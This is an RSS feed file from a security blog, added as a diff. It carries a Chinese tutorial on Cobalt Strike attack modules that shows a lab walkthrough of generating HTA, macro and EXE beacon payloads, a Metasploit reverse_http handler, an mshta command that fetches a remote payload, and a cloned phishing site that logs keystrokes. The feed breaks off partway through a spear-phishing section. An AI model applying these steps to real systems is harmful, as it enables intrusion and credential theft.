@@ -1,0 +1,706 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Or0kit • Posts by &#34;后渗透&#34; category</title>
+        <link>https://Or0kit.github.io</link>
+        <description>临渊羡鱼，不如退而结网</description>
+        <language>zh-CN</language>
+        <pubDate>Wed, 07 Jul 2021 14:27:57 +0800</pubDate>
+        <lastBuildDate>Wed, 07 Jul 2021 14:27:57 +0800</lastBuildDate>
+        <category>Drozer</category>
+        <category>Algolia</category>
+        <category>同义词替换</category>
+        <category>xpath</category>
+        <category>win32api</category>
+        <category>WOW64</category>
+        <category>windows消息机制</category>
+        <category>虚拟内存</category>
+        <category>jsDelivr</category>
+        <category>First blog</category>
+        <category>markdown 学习</category>
+        <category>Android</category>
+        <category>替换密钥</category>
+        <category>数论基础</category>
+        <category>ADB</category>
+        <category>雷电模拟器</category>
+        <category>Hadoop</category>
+        <category>IDA</category>
+        <category>Windows逆向</category>
+        <category>SSH隧道</category>
+        <category>url</category>
+        <category>http</category>
+        <category>Nginx</category>
+        <category>Linux</category>
+        <category>CentOS7配置vsftp</category>
+        <category>Psad</category>
+        <category>fwsnort</category>
+        <category>应急响应</category>
+        <category>x86汇编指令</category>
+        <category>逆向</category>
+        <category>IDA学习</category>
+        <category>恶意代码分析实战入门</category>
+        <category>静态分析基础</category>
+        <category>动态分析技术基础</category>
+        <category>加壳</category>
+        <category>脱壳</category>
+        <category>C++壳</category>
+        <category>ESP寻址</category>
+        <category>定位Win32窗口回调函数</category>
+        <category>HOOK攻防</category>
+        <category>瞬时HOOK过检测</category>
+        <category>INLINE-HOOK</category>
+        <category>IAT HOOK</category>
+        <category>INLINE HOOK</category>
+        <category>进程监控</category>
+        <category>模块隐藏</category>
+        <category>进程通信</category>
+        <category>tlhelp32.h</category>
+        <category>进程遍历</category>
+        <category>模块遍历</category>
+        <category>TEB</category>
+        <category>PEB</category>
+        <category>R3层断链</category>
+        <category>外挂原理</category>
+        <category>DLL注入之进程间通信</category>
+        <category>Win临界区</category>
+        <category>Win互斥体</category>
+        <category>内存映射文件</category>
+        <category>内存映射共享</category>
+        <category>写拷贝</category>
+        <category>Win事件</category>
+        <category>线程同步</category>
+        <category>Win子窗口控件</category>
+        <category>win32文件函数</category>
+        <category>代码注入</category>
+        <category>窗口程序</category>
+        <category>消息机制</category>
+        <category>消息类型</category>
+        <category>私有内存</category>
+        <category>共享内存</category>
+        <category>设备对象</category>
+        <category>DC设备上下文</category>
+        <category>图形对象</category>
+        <category>创建线程</category>
+        <category>线程控制</category>
+        <category>线程相关API</category>
+        <category>线程上下文</category>
+        <category>CONTEXT结构体</category>
+        <category>物理内存</category>
+        <category>Windows进程</category>
+        <category>句柄表</category>
+        <category>远程线程函数</category>
+        <category>远程线程</category>
+        <category>DLL注入</category>
+        <category>DLL注入相关函数</category>
+        <category>WinMain函数</category>
+        <category>调用约定</category>
+        <category>我的GetProcAddress</category>
+        <category>资源文件</category>
+        <category>消息断点</category>
+        <category>通用控件</category>
+        <category>WM_NOTIFY消息类型</category>
+        <category>MFC</category>
+        <category>PE查看器</category>
+        <category>PE课后作业</category>
+        <category>RVA与FOA</category>
+        <category>PE结构</category>
+        <category>DOS头属性说明</category>
+        <category>标准PE头属性说明</category>
+        <category>扩展PE头属性说明</category>
+        <category>节表属性说明</category>
+        <category>空白区添加代码</category>
+        <category>合并节</category>
+        <category>导入表</category>
+        <category>注入</category>
+        <category>导入表注入</category>
+        <category>导出表</category>
+        <category>新增节</category>
+        <category>移动NT头</category>
+        <category>扩大节</category>
+        <category>移动导出表</category>
+        <category>移动重定位表</category>
+        <category>重定位表</category>
+        <category>静态链接库</category>
+        <category>动态链接库</category>
+        <category>句柄</category>
+        <category>button</category>
+        <category>单选框</category>
+        <category>复选框件</category>
+        <category>Edit</category>
+        <category>Combo Box</category>
+        <category>Tab</category>
+        <category>ListCtrl</category>
+        <category>MFC的本质</category>
+        <category>MFC的层次结构图</category>
+        <category>手动创建一个MFC程序</category>
+        <category>MFC的初始化过程</category>
+        <category>MFC运行时类型识别</category>
+        <category>关键字static</category>
+        <category>关键字const</category>
+        <category>MFC动态创建</category>
+        <category>MFC消息映射</category>
+        <category>结构体AFX_MSGMAP_ENTRY</category>
+        <category>结构体AFX_MSGM</category>
+        <category>MFC的三大类消息</category>
+        <category>数据传输</category>
+        <category>ini文件的读写</category>
+        <category>python</category>
+        <category>SSH</category>
+        <category>python文件读取</category>
+        <category>数据分析</category>
+        <category>socket</category>
+        <category>数据库编程</category>
+        <category>python内置属性</category>
+        <category>multiprocessing</category>
+        <category>threading</category>
+        <category>scrapy</category>
+        <category>测试</category>
+        <category>BHP</category>
+        <category>Python的import功能</category>
+        <category>木马</category>
+        <category>STL</category>
+        <category>Vector容器</category>
+        <category>Deque容器</category>
+        <category>List容器</category>
+        <category>Set容器</category>
+        <category>Multiset容器</category>
+        <category>Map容器</category>
+        <category>Multimap容器</category>
+        <category>Stack容器</category>
+        <category>Queue容器</category>
+        <category>STL算法</category>
+        <category>STL迭代器</category>
+        <category>CobaltStrike</category>
+        <category>RedTeam</category>
+        <category>Apeache</category>
+        <category>Nmap</category>
+        <category>php</category>
+        <category>guestbook</category>
+        <category>SQLmap</category>
+        <category>apache</category>
+        <category>log</category>
+        <category>mysql主键</category>
+        <category>CSRF</category>
+        <category>SSRF</category>
+        <category>业务逻辑漏洞</category>
+        <category>xss</category>
+        <category>webshell流量特征</category>
+        <category>虚拟网卡</category>
+        <category>0环与3环的通信（常规方法）</category>
+        <category>内核空间</category>
+        <category>内核模块</category>
+        <category>遍历内核模块</category>
+        <category>定位未导出函数PspTiminateProcess</category>
+        <category>内核编程基础</category>
+        <category>ANSI_STRING</category>
+        <category>UNICODE_STRING</category>
+        <category>内核内存</category>
+        <category>上下文环境</category>
+        <category>中断请求级别</category>
+        <category>链表</category>
+        <category>自旋锁</category>
+        <category>注册表</category>
+        <category>地址空间</category>
+        <category>文件操作</category>
+        <category>线程与事件</category>
+        <category>内核重载</category>
+        <category>驱动调试</category>
+        <category>配置VS2019+WDK10</category>
+        <category>第一个驱动程序</category>
+        <category>调试驱动程序</category>
+        <category>OpenSCManager</category>
+        <category>CreateService</category>
+        <category>APC的本质</category>
+        <category>APC的备用队列</category>
+        <category>消息队列</category>
+        <category>PsConvertToGuiThread</category>
+        <category>win32k.sys</category>
+        <category>GUI线程</category>
+        <category>窗口程序的创建</category>
+        <category>消息循环</category>
+        <category>线性地址的管理</category>
+        <category>VAD树</category>
+        <category>_MMVAD</category>
+        <category>_MMVAD_FLAGS</category>
+        <category>VirtualAlloc</category>
+        <category>MEM_COMMIT与MEM_RESERVE</category>
+        <category>malloc</category>
+        <category>堆内存</category>
+        <category>栈内存</category>
+        <category>全局区内存</category>
+        <category>共享物理页</category>
+        <category>共享文件</category>
+        <category>LoadLibrary的本质</category>
+        <category>MmAddPhysicalMemoryEx</category>
+        <category>缺页异常</category>
+        <category>临界区</category>
+        <category>KPCR结构体</category>
+        <category>等待链表</category>
+        <category>调度链表</category>
+        <category>模拟线程切换</category>
+        <category>模拟挂起与恢复函数</category>
+        <category>进程的创建</category>
+        <category>获取当前进程</category>
+        <category>ETHREAD</category>
+        <category>KTHREAD</category>
+        <category>EPROCESS</category>
+        <category>KPROCESS</category>
+        <category>2-9-9-12分页</category>
+        <category>PAE</category>
+        <category>PDPTE</category>
+        <category>PDE</category>
+        <category>PTE</category>
+        <category>XD标志位</category>
+        <category>逆向分析MmIsAddressValid函数(2-9-9-12)</category>
+        <category>PWT</category>
+        <category>PDT</category>
+        <category>TLB</category>
+        <category>CPU缓存</category>
+        <category>INVLPG指令</category>
+        <category>全局页</category>
+        <category>ShadowWalker</category>
+        <category>中断</category>
+        <category>异常</category>
+        <category>CLI指令</category>
+        <category>STI指令</category>
+        <category>INT2</category>
+        <category>INT8</category>
+        <category>中断门描述符</category>
+        <category>IDT</category>
+        <category>提权</category>
+        <category>TSS</category>
+        <category>跨段跳转流程</category>
+        <category>JMP FAR指令</category>
+        <category>任务门</category>
+        <category>LDT段描述符</category>
+        <category>LDT</category>
+        <category>CR0</category>
+        <category>CR2</category>
+        <category>CR4</category>
+        <category>CRL</category>
+        <category>DPL</category>
+        <category>RPL</category>
+        <category>段寄存器结构</category>
+        <category>段描述符</category>
+        <category>段选择子</category>
+        <category>GDT表</category>
+        <category>调用门</category>
+        <category>调用门描述符</category>
+        <category>逆向分析MmIsAddressValid函数</category>
+        <category>error C2143</category>
+        <category>error C2275</category>
+        <category>CALL与CALL FAR</category>
+        <category>陷阱门描述符</category>
+        <category>页目录表基址</category>
+        <category>页表的基址</category>
+        <category>0地址执行ShellCode</category>
+        <category>10-10-12分页</category>
+        <category>PDE_PTE</category>
+        <category>物理页</category>
+        <category>SSDT HOOK</category>
+        <category>OpenProcess</category>
+        <category>系统服务表</category>
+        <category>SSDT</category>
+        <category>SSDT HOOK隐藏</category>
+        <category>API进出内核</category>
+        <category>系统调用阶段总结</category>
+        <category>网络安全法</category>
+        <category>ASCII</category>
+        <category>GBK</category>
+        <category>ANSI</category>
+        <category>Unicode</category>
+        <category>UTF-8</category>
+        <category>URL 编码/解码</category>
+        <category>十进制</category>
+        <category>二进制</category>
+        <category>十六进制</category>
+        <category>内存</category>
+        <category>编写ShellCode实现IAT HOOK</category>
+        <category>ShellCode原则</category>
+        <category>傀儡进程加密壳</category>
+        <category>ZwUnmapViewOfSection函数</category>
+        <category>加载图标</category>
+        <category>提取图标</category>
+        <category>资源表</category>
+        <category>MFC命令传递</category>
+        <category>远控界面编写</category>
+        <category>HTML</category>
+        <category>文件包含</category>
+        <category>sql注入</category>
+        <category>经典定长指令</category>
+        <category>经典变长指令</category>
+        <category>指令前缀</category>
+        <category>进程句柄表</category>
+        <category>全局句柄表</category>
+        <category>KAPC</category>
+        <category>QueueUserAPC</category>
+        <category>NtQueueApcThread</category>
+        <category>KeInitializeApc</category>
+        <category>KeInsertQueueApc</category>
+        <category>KiInsertQueueApc</category>
+        <category>消息队列与线程</category>
+        <category>Windows线程切换</category>
+        <category>KiSwapContext</category>
+        <category>SwapContext</category>
+        <category>时钟中断</category>
+        <category>时间片管理</category>
+        <category>线程切换与TSS</category>
+        <category>线程切换与FS</category>
+        <category>线程切换与线程优先级</category>
+        <category>快速调用</category>
+        <category>中断调用</category>
+        <category>分析ReadProcessMemory</category>
+        <category>KiFastSystemCall</category>
+        <category>KiIntSystemCall</category>
+        <category>重写3环</category>
+        <category>文件上传</category>
+        <category>隐藏驱动</category>
+        <category>IopLoadDriver</category>
+        <category>延迟过程调用</category>
+        <category>进程挂靠</category>
+        <category>跨进程读写内存</category>
+        <category>APC</category>
+        <category>逆向分析NtReadVirtualMemory</category>
+        <category>逆向分析NtWriteVIrtualMemory</category>
+        <category>AD-Attack-Defense</category>
+        <category>payload</category>
+        <category>sysenter指令</category>
+        <category>KiFastCallEntry函数</category>
+        <category>KiSystemService函数</category>
+        <category>Trap_Frame</category>
+        <category>web安全</category>
+        <category>Pentest</category>
+        <item>
+            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
+            <title>CobaltStrike攻击模块的使用</title>
+            <link>https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
+            <category>CobaltStrike</category>
+            <pubDate>Wed, 07 Jul 2021 14:27:57 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;attacks模块简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#attacks模块简介&#34;&gt;#&lt;/a&gt; Attacks 模块简介&lt;/h1&gt;
+&lt;h2 id=&#34;packages模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#packages模块&#34;&gt;#&lt;/a&gt; packages 模块&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;HTML Application:&lt;br /&gt;
+ 生成一个恶意 HTML Application 木马，后缀格式为 .hta。通过 HTML 调用其他语言的应用组件进行攻击，提供了可执行文件、PowerShell、VBA 三种方法&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;MS Office Macro:&lt;br /&gt;
+ 生成 office 宏病毒文件；&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Payload Generator:&lt;br /&gt;
+ 生成各种语言版本的 payload，可以生成基于 C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA 等的 payload&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Windows Executable:&lt;br /&gt;
+ 生成 32 位或 64 位的 exe 和基于服务的 exe、DLL 等后门程序&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Windows Executable(S)&lt;br /&gt;
+ 用于生成一个 exe 可执行文件，其中包含 Beacon 的完整 payload，不需要阶段性的请求。&lt;br /&gt;
+与 Windows Executable 模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持 powershell 脚本，可用于将 Stageless Payload 注入内存。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;web-drive-by-网站钓鱼攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-drive-by-网站钓鱼攻击&#34;&gt;#&lt;/a&gt; Web Drive-by 网站钓鱼攻击&lt;/h2&gt;
+&lt;p&gt;点击中间的 Attacks——&amp;gt; Web Drive-by（网站钓鱼攻击）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Manage　　　　　　　　　　 对开启的 web 服务进行管理；&lt;br /&gt;
+Clone Site 　　 　　　　　克隆网站，可以记录受害者提交的数据；&lt;br /&gt;
+Host File 　　　　　　　　提供一个文件下载，可以修改 Mime 信息；Host File 可以配合 DNS 欺骗实现挂马效果使用&lt;br /&gt;
+ Scripted Web Delivery    基于 Web 的攻击测试脚本，自动生成可执行的 payload ;&lt;br /&gt;
+Signed Applet Attack 　　启动一个 Web 服务以提供自签名 Java Applet 的运行环境；&lt;br /&gt;
+Smart Applet Attack 　　 自动检测 Java 版本并 l 利用已知的 exploits 绕过 security；&lt;br /&gt;
+System Profiler　　　　　用来获取一些系统信息，比如系统版本，Flash 版本，浏览器版本等。&lt;br /&gt;
+Spear Phish 　　　　　　　用来邮件钓鱼的模块&lt;/p&gt;
+&lt;h1 id=&#34;cobaltstrike-attacks模块的利用方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cobaltstrike-attacks模块的利用方法&#34;&gt;#&lt;/a&gt; CobaltStrike Attacks 模块的利用方法&lt;/h1&gt;
+&lt;h2 id=&#34;msf与cobaltstrike结合获取meterpreter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf与cobaltstrike结合获取meterpreter&#34;&gt;#&lt;/a&gt; MSF 与 CobaltStrike 结合获取 meterpreter&lt;/h2&gt;
+&lt;p&gt;在 CobaltStrike 中的 Listenter 中有一些 Foreign 的载荷（payload），常用于于 MSF 结合&lt;/p&gt;
+&lt;p&gt;创建 Beacon Listener&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 Foregin (windows/foregin/reverse_http) -&amp;gt;  msf 攻击机 ip/msf 监听端口 (192.168.199.145:4444)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在攻击机上进行 msf 监听&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;use exploit/multi/handler&lt;br /&gt;
+set payload windows/meterpreter/reverse_http&lt;br /&gt;
+set lhost 192.168.199.145&lt;br /&gt;
+set lport 4444&lt;br /&gt;
+run/exploit&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;生成攻击文件在目标机器运行既可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;利用web服务远程加载文件获取beacon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用web服务远程加载文件获取beacon&#34;&gt;#&lt;/a&gt; 利用 web 服务，远程加载文件，获取 beacon&lt;/h2&gt;
+&lt;p&gt;利用 &lt;code&gt;Attack -&amp;gt;  packeg&lt;/code&gt;  中的 &lt;code&gt;HTML Application&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;一个 &lt;code&gt;HTML Application&lt;/code&gt; （HTML 应用）是一个使用 HTML 和一个 Internet 浏览器支持的脚本语言编写的 Windows 程序。该程序包生成一个 HTML 应用，该应用运行一个 &lt;code&gt;Cobalt Strike payload&lt;/code&gt; 。你可以选择一个 HTML 应用，此 HTML 应用使得一个可执行文件落地在磁盘上并运行它。选择 &lt;code&gt;powershell&lt;/code&gt;  选项来得到一个 HTML 应用，该应用应该使用 &lt;code&gt;Powershell&lt;/code&gt;  来运行一个 &lt;code&gt;payload&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;新建一个 &lt;code&gt;Linsenter&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;创建一个.hta 的恶意文件&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attacks -&amp;gt;  Package -&amp;gt;  HTML Application -&amp;gt;  选择 Listener -&amp;gt;  method 选择 powershell -&amp;gt;  Generate&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;加载本地文件到服务端，进行 web 服务&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attacks -&amp;gt;  Web Drive-by -&amp;gt;  Host File -&amp;gt;  File 选择本地生成的.hta 文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;目标机 cmd.exe 中运行以下命令（白名单文件 mshta.exe 无免杀，在加载.hta 文件时可被多种杀软查杀)(mshta.exe 是微软 Windows 操作系统相关程序，用于执行.HTA 文件，或在批处理中结合其他语言的代码；如：mshta javascript，可用于运行一个 HTML 网页而不会出现安全警告。)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;mshta &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1pcCstMHkzZTE4OW8vZG93bmxvYWQvZmlsZS5leHQ=&#34;&gt;http://ip + 端口 /download/file.ext&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;靶机上线。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ms-office-macro-宏获取beacon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ms-office-macro-宏获取beacon&#34;&gt;#&lt;/a&gt; MS Office Macro 宏获取 beacon&lt;/h2&gt;
+&lt;p&gt;利用 Attack -&amp;gt;  Package -&amp;gt;  MS office Macro&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;MS office Macro&lt;/code&gt;  模块提供一个 &lt;code&gt;Microsoft Office&lt;/code&gt;  的宏文件，并提供嵌入 &lt;code&gt;Microsoft World&lt;/code&gt;  或 &lt;code&gt;Microsoft Excel&lt;/code&gt;  的说明&lt;/p&gt;
+&lt;p&gt;新建一个 &lt;code&gt;Linsenter&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;利用 &lt;code&gt;MS Office Macro&lt;/code&gt;  模块获取宏&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attack -&amp;gt;  Package -&amp;gt;  MS office Macr&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;将获取的宏嵌入到文档当中&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Microsoft World 文档 -&amp;gt;  视图 -&amp;gt;  宏 -&amp;gt;  宏名任意 -&amp;gt;  创建 -&amp;gt;  Microsoft Visual Basic for Application 控制台 -&amp;gt;  将生成的宏复制到代码区 -&amp;gt; 保存&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image006.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;靶机上线。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;制作钓鱼网址盗取用户输入信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#制作钓鱼网址盗取用户输入信息&#34;&gt;#&lt;/a&gt; 制作钓鱼网址盗取用户输入信息&lt;/h2&gt;
+&lt;p&gt;利用 Attack -&amp;gt;  Web Drive-by -&amp;gt; Clone Site 制作钓鱼网址&lt;/p&gt;
+&lt;p&gt;在向目标发送漏洞利用程序之前，进行伪装会有所帮助。 &lt;code&gt;Cobalt Strike&lt;/code&gt;  的网站克隆工具可以帮助此目标。网站克隆工具制作一个网站的本地的复制，使用一些增加的代码来修复连接和图像这样它们可以如预期一样工作。&lt;/p&gt;
+&lt;p&gt;建立 &lt;code&gt;Linstener&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;利用 &lt;code&gt;Clone Site&lt;/code&gt;  获取钓鱼网址&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attack -&amp;gt;  Web Drive-by -&amp;gt; Clone Site -&amp;gt;  Clone Url (被克隆网址) -&amp;gt;  勾选 Log Keystroken on Cloned site&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;利用网站日志（web Log）查看被钓鱼方输入的信息&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;View -&amp;gt;  Web Log&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;如下为被克隆网站&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image009.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;简单exe等可执行文件上线目标主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单exe等可执行文件上线目标主机&#34;&gt;#&lt;/a&gt; 简单 EXE 等可执行文件上线目标主机&lt;/h2&gt;
+&lt;p&gt;利用 Attack -&amp;gt;  Packages -&amp;gt;  Windows Executable/(s)&lt;/p&gt;
+&lt;p&gt;该程序包含一个 Windows 可执行 &lt;code&gt;Artifact&lt;/code&gt; ，用于传送一个 &lt;code&gt;Payload Stager&lt;/code&gt; 。这个程序包为使用者提供了多种输出选项。 &lt;code&gt;Windows Service EXE&lt;/code&gt;  是一个 Windows 可执行文件，可响应 &lt;code&gt;Service Control Manager&lt;/code&gt;  命令。使用者可以使用这个可执行文件来作为使用 &lt;code&gt;SC&lt;/code&gt;  命令行的 Windows 服务的调用程序，或使用 &lt;code&gt;Metasploit&lt;/code&gt;  框架的 &lt;code&gt;PsExec&lt;/code&gt;  模块生成一个自定义的可执行文件。&lt;br /&gt;
+普通的 EXE 和服务器启动调用的 EXE 是由区别的，利用 &lt;code&gt;Windows Service EXE&lt;/code&gt;  生成的 EXE 才能用来作为服务自启动的 EXE，利用 &lt;code&gt;Cobalt Strike&lt;/code&gt;  中 Windows EXE 生成的 EXE 不能作为服务自启动的 EXE 程序。&lt;/p&gt;
+&lt;p&gt;创建一个监听&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;生成可执行程序&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attack -&amp;gt;  Packages -&amp;gt; windows Executable/(s)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;目标机器运行可执行文件，上线目标主机&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image010.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;生成 Powershell 版的需要在目标主机的 Powershell 控制台运行该 ps1 脚本&lt;br /&gt;
+生成 dll 文件，需要在目标主机加载&lt;/p&gt;
+&lt;h2 id=&#34;利用msf结合cobalt-strike获取cs-beacon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用msf结合cobalt-strike获取cs-beacon&#34;&gt;#&lt;/a&gt; 利用 MSF 结合 Cobalt Strike 获取 CS beacon&lt;/h2&gt;
+&lt;p&gt;在 0x01 部分，我们知道 Cobalt Strike 可以与 MSF 配合获取 meterpreter，当然，二者也可以相互配合获取 Beacon。&lt;/p&gt;
+&lt;p&gt;你可以使用 MSF 中的 &lt;code&gt;exploit/windows/local/payload_inject&lt;/code&gt;  模块将 MSF 获取的 &lt;code&gt;meterpreter&lt;/code&gt;  传送给 &lt;code&gt;Cobalt Strike&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Cobalt Strike 新建一个 &lt;code&gt;Listener&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;CobaltStrike -&amp;gt;  Listener -&amp;gt;  add -&amp;gt;  payload 选择 (windows/beacon_http/reverse_http)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;MSF 获取目标 &lt;code&gt;meterpreter&lt;/code&gt; &lt;br /&gt;
+ 将 &lt;code&gt;meterpreter&lt;/code&gt;  利用 &lt;code&gt;exploit/windows/local/payload_inject&lt;/code&gt;  模块传送给 CS&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;background&lt;br /&gt;
+use exploit/windows/local/payload_inject&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;设定 CS 的 ip 和监听端口&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;set LHOST CSip&lt;br /&gt;
+set LPORT CS Listener 监听端口&lt;br /&gt;
+ set disablepayloadhandler true&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image011.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;设定传送的 &lt;code&gt;session&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;set session id&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;session id 可输入 &lt;code&gt;sessions&lt;/code&gt;  查看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image012.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;运行即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image013.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;payload-generatorpayload-生成器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload-generatorpayload-生成器&#34;&gt;#&lt;/a&gt; Payload Generator (Payload 生成器)&lt;/h2&gt;
+&lt;p&gt;该模块可以生成 n 中语言的后门 Payload，包括 C,C#,Python,Java,Perl,Powershell 脚本，Powershell 命令，Ruby,Raw，免杀框架 Veli 中的 shellcode 等等... 这是 CS 的一个很大的迷人之处。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;attack -&amp;gt;  Packages -&amp;gt;  payload Generator&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cs发送钓鱼邮件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cs发送钓鱼邮件&#34;&gt;#&lt;/a&gt; CS 发送钓鱼邮件&lt;/h2&gt;
+&lt;p&gt;CS 能生成 Office 宏，发现生成的该文件很容易被杀软监测出来，并处理掉，加上它的局限性，在外网实际中意义不大，在内网用效果可能还好。主要是思路。&lt;/p&gt;
+&lt;p&gt;实验环境&lt;/p&gt;
+&lt;p&gt;虚拟机搭建的邮件服务器地址：192.168.199.133&lt;/p&gt;
+&lt;p&gt;Cobalt strike 服务器地址：192.168.199.145&lt;/p&gt;
+&lt;p&gt;Kali 虚拟机地址：192.168.199.145&lt;/p&gt;
+&lt;p&gt;这里我们应用到一个 flash 插件漏洞的 payloads： &lt;code&gt;adobe_flash_hacking_team_uaf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;通过 Cobalt Strike 结合 metasploit 进行实验，如下：&lt;/p&gt;
+&lt;p&gt;通过 kali 启用 metasploit。&lt;/p&gt;
+&lt;p&gt;配置：&lt;/p&gt;
